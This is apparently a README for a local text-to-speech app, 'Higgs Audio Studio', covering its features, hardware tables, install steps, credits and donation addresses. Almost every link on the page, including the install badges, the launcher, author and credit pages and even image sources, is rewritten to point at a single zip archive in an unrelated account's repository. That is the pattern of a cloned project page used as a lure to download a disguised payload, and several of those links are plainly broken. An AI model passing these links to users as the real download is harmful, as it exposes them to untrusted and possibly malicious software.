<div align="center">

# Higgs Audio Studio

**Portable local text-to-speech built on Higgs Audio v3 TTS — expressive speech in 100+ languages, zero-shot voice cloning, an AI text director, plus Podcast and Audiobook modes. 100% offline, one click.**

[![License](https://img.shields.io/badge/license-Research_%26_Non--Commercial-orange?style=flat-square)](#license)
[![Stars](https://img.shields.io/github/stars/timoncool/HiggsAudio-Studio?style=flat-square)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
[![Last Commit](https://img.shields.io/github/last-commit/timoncool/HiggsAudio-Studio?style=flat-square)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)

**[English](README.md)** · **[Русский](README_RU.md)**

<img src="docs/screenshot-en.png" alt="Higgs Audio Studio — English UI" width="600"/>

</div>

> 🚀 **One-click cross-platform install via [Pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip):**
> [![Install on Pinokio](https://img.shields.io/badge/🚀_Install_on-Pinokio-7c3aed?style=for-the-badge)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
> [![Open in Pinokio](https://img.shields.io/badge/📂_Open_in-Pinokio-6d28d9?style=for-the-badge)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
>
> Works on **Windows / Linux (x64 & aarch64) / macOS** · NVIDIA / AMD / Apple Silicon / CPU. No `install.bat` — Pinokio sets up CUDA, Python 3.12, PyTorch and dependencies for you. Launcher: **[timoncool/HiggsAudio-Studio-pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)**

Generate expressive speech in 100+ languages, clone any voice from a reference clip, let a local LLM direct the delivery, and produce full **podcasts** and **audiobooks** — entirely on your machine. **100% offline**, no cloud, no API keys. Everything lives inside the folder: Python, dependencies, models, cache. Delete the folder — the app is gone.

Built on [Higgs Audio v3 TTS](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) by Boson AI — a 4B expressive TTS model with native multi-speaker and inline emotion/prosody control.

## Features

- **🎙️ TTS** — text → speech, 100+ languages; temperature, top-p/k, seed lock; autoplay; **⏹ Stop** interrupts generation on the fly (at the inference level); per-frame progress in the terminal.
- **🎭 Expression + 🤖 Director** — insert control tags (`<|emotion|>`, `<|sfx|>`, `<|prosody|>`, `<|style|>`) with buttons + an **Enrich** button: a lightweight local LLM normalizes the text and places emotion/sound/prosody tags by meaning.
- **🧬 Voice cloning** — zero-shot from a reference clip with auto-transcription (Moonshine ASR); preset library + on-demand Russian voice pack.
- **🎬 Podcast / Dialogue** — the LLM writes a multi-speaker script, each speaker its own voice → stitched with **loudness leveling across speakers** (LUFS −16, podcast standard — no speaker quieter than another).
- **📚 Audiobook** — narrator/character attribution with a persistent roster (same character = same voice), long-form with timbre carry-over + loudness normalization.
- **📦 Batch** — a list of texts → mass synthesis with a live log.
- **💾 Output format** — WAV / MP3 / FLAC / OGG; results saved to `output/` with timestamps.

**43 control tags:** 21 emotions, 10 prosody, 3 styles, 9 sounds. **AI director** — switchable GGUF model: Qwen3.5-9B (default, ~5.5 GB) / Qwen3.5-4B (light, ~2.5 GB), runs on GPU via llama.cpp. Higgs TTS quantization is on-the-fly (⚗️ experimental), auto by VRAM. **RU / EN** UI.

## System Requirements

### Platforms (via the Pinokio launcher)

| OS | GPU | Status | Acceleration |
|---|---|---|---|
| Windows 10/11 | NVIDIA RTX 30xx–50xx | ✅ tested | CUDA 12.8 + Triton (torch.compile ~2×) |
| Windows 10/11 | NVIDIA RTX 20xx | ✅ expected | CUDA 12.8 + Triton |
| Linux x64 | NVIDIA RTX 20xx–50xx | ✅ expected | CUDA 12.8 + Triton |
| Linux aarch64 | NVIDIA DGX Spark / Jetson | ✅ expected | CUDA 13.0 |
| Windows | AMD RDNA3+ | ✅ expected | DirectML |
| Linux | AMD RDNA3+ | ✅ expected | ROCm 6.3 |
| macOS | Apple Silicon M1–M4 | ✅ expected | MPS |
| macOS | Intel | ⚠️ CPU only | torch CPU |
| Any | CPU only | ⚠️ very slow | CPU |

> Higgs uses PyTorch SDPA (flash kernels built in) and does not need external Flash-Attention 2. The local `install.bat` build targets NVIDIA Windows; full cross-platform support is via [Pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip).

### Memory (NVIDIA; TTS is quantized on the fly, the LLM director loads separately)

| VRAM | TTS mode | LLM director |
|------|----------|--------------|
| 24 GB+ | bf16 (~11 GB) | 9–12B in 4-bit (~6–8 GB) |
| 12 GB | 8-bit (~6–7 GB) | 4–9B in 4-bit (~3–6 GB) |
| 6–8 GB | 4-bit (~3.5 GB) | 2–4B in 4-bit (~1.5–3 GB) |
| CPU | works, very slow | — |

Models (~9 GB TTS + LLM) download automatically on first run.

## Quick Start

1. **Download** this repository.
2. **Install** — run **`install.bat`**, pick your GPU (CUDA 11.8 / 12.6 / 12.8 or CPU). It sets up portable Python, PyTorch and dependencies.
3. **Run** — run **`run.bat`**; the app opens in the browser, models download on first launch. Update with **`update.bat`**.

Or install one-click cross-platform via [Pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) — no `install.bat` needed.

## Other Projects by [@timoncool](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)

| Project | Description |
|---------|-------------|
| [VoxCPM2 Portable](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Multilingual TTS + Voice Design + LoRA fine-tuning |
| [Qwen3-TTS](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable text-to-speech with voice cloning |
| [ACE-Step Studio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | AI music studio — songs, vocals, covers, videos |
| [Foundation Music Lab](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Music generation + timeline editor |
| [VibeVoice ASR](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable speech recognition |
| [LavaSR](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable audio enhancement |
| [SuperCaption Qwen3-VL](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable image captioning |
| [VideoSOS](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | AI video production in the browser |

## Authors

- **Nerual Dreming** — [Telegram](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | [neuro-cartel.com](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | [ArtGeneration.me](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
- **Нейро-Софт** — [Telegram](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | portable AI builds

## Acknowledgments

- **[Boson AI — Higgs Audio v3](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — the TTS model
- **[multimodalart](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — transformers port of the model
- **[Slait/russia_voices](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — 743 Russian voice presets
- **[Moonshine ASR](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — reference auto-transcription
- **[pyloudnorm](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — EBU R128 loudness leveling · **[Gradio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — UI framework

## Support the Author

I build open-source software and do AI research. Most of what I create is free and available to everyone. Your donations help me keep creating without worrying about where the next meal comes from =)

**[All donation methods](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** | **[dalink.to/nerual_dreming](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** | **[boosty.to/neuro_art](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)**

- **BTC:** `1E7dHL22RpyhJGVpcvKdbyZgksSYkYeEBC`
- **ETH (ERC20):** `0xb5db65adf478983186d4897ba92fe2c25c594a0c`
- **USDT (TRC20):** `TQST9Lp2TjK6FiVkn4fwfGUee7NmkxEE7C`

## Star History

<a href="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip" />
   <source media="(prefers-color-scheme: light)" srcset="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip" />
   <img alt="Star History Chart" src="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip" />
 </picture>
</a>

## License

The wrapper code is open. **The Higgs Audio v3 weights are distributed by Boson AI under a Research & Non-Commercial license** — this application is non-commercial. Voice cloning only with the consent of the voice owner; impersonation, fraud and any illegal use are prohibited. See the [model card](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip).
